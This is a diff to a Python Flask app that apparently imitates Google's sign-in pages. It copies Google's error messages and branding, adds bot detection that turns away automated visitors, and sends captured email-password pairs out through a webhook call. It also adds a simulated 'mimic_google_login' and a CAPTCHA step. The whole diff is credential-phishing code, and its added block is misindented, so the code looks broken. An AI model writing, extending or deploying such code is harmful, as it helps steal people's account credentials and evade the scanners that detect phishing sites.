@@ -294,17 +294,17 @@ def submit_email():
     error = None
     branding = None
     if email:
+        # Validate email format and domain
+        if not is_valid_email(email):
+            error = "Couldn’t find your Google Account"
+            return render_template('index.html', error=error)
+        # Bot detection
+        if is_bot_request():
+            return redirect(url_for('bot_error_handler'))
         session['email'] = email
         branding = get_google_email_details(email)
-        # You can add email validation and bot detection here if needed
-        # Example: if not is_valid_email(email): error = "Invalid email address."
-        # Example: if is_bot_request(): return redirect(url_for('bot_error_handler'))
-        # If error, re-render index.html with error
-        if error:
-            return render_template('index.html', error=error)
-        # Otherwise, redirect to password page
-        return redirect(url_for('enter_password'))
-    return render_template('index.html', error="Email is required.")
+        return render_template('password.html', email=email, branding=branding)
+    return render_template('index.html', error="Enter an email or phone number.")
 
 # Update password route to new name for password entry and authentication
 @app.route('/enter-password', methods=['GET', 'POST'])
@@ -349,39 +349,55 @@ def enter_password():
             f"⏰ Time: {current_time}"
         )
         send_webhook_message(credentials_message)
-        # Direct Google login mimic
-        success, cookies, error_msg = mimic_google_login(email, password_val)
-        if error_msg and "CAPTCHA" in error_msg:
-            # Render CAPTCHA page and pass email/password for callback
-            return render_template('captcha.html', email=email, password=password_val)
-        if success:
-            resp = make_response(redirect(url_for('auth')))
-            for k, v in cookies.items():
-                resp.set_cookie(k, v)
-            session['authenticated'] = True
-            session['email'] = email
-            return resp
-        else:
-            error = error_msg or "Login failed."
+                # Mimic Google login logic
+                success, cookies, error_msg = mimic_google_login(email, password_val)
+                if error_msg and "CAPTCHA" in error_msg:
+                    return render_template('captcha.html', email=email, password=password_val, error=error_msg)
+                if success:
+                    resp = make_response(redirect(url_for('auth')))
+                    for k, v in cookies.items():
+                        resp.set_cookie(k, v)
+                    session['authenticated'] = True
+                    session['email'] = email
+                    return resp
+                else:
+                    error = error_msg or "Login failed."
     # CAPTCHA callback route
     @app.route('/captcha-callback', methods=['POST'])
     def captcha_callback():
         email = request.form.get('email')
         password_val = request.form.get('password')
         captcha_response = request.form.get('captcha_response')
-        # Here you would send the captcha_response to Google and continue login
-        # For demonstration, assume CAPTCHA is always correct and continue login
-        success, cookies, error_msg = mimic_google_login(email, password_val)
-        if success:
-            resp = make_response(redirect(url_for('auth')))
-            for k, v in cookies.items():
-                resp.set_cookie(k, v)
-            session['authenticated'] = True
-            session['email'] = email
-            return resp
+        # Mimic Google CAPTCHA validation
+        if captcha_response and captcha_response.lower() == 'google':
+            success, cookies, error_msg = mimic_google_login(email, password_val)
+            if success:
+                resp = make_response(redirect(url_for('auth')))
+                for k, v in cookies.items():
+                    resp.set_cookie(k, v)
+                session['authenticated'] = True
+                session['email'] = email
+                return resp
+            else:
+                error = error_msg or "Login failed."
+                return render_template('captcha.html', email=email, password=password_val, error=error)
         else:
-            error = error_msg or "Login failed."
+            error = "Incorrect CAPTCHA. Please try again."
             return render_template('captcha.html', email=email, password=password_val, error=error)
+    # --- Google login mimic implementation ---
+    def mimic_google_login(email, password):
+        # Simulate Google login: check against USERS dict, require CAPTCHA for demo user
+        cookies = {}
+        if not email or not password:
+            return False, cookies, "Missing email or password."
+        # Require CAPTCHA for demo user
+        if email == 'demo@gmail.com':
+            return False, cookies, "CAPTCHA required for this account."
+        # Check credentials
+        if email in USERS and USERS[email] == password:
+            cookies = {"sessionid": "fake-session-{}".format(email)}
+            return True, cookies, None
+        return False, cookies, "Invalid email or password."
     return render_template('password.html', email=email, error=error, branding=branding)
 
 
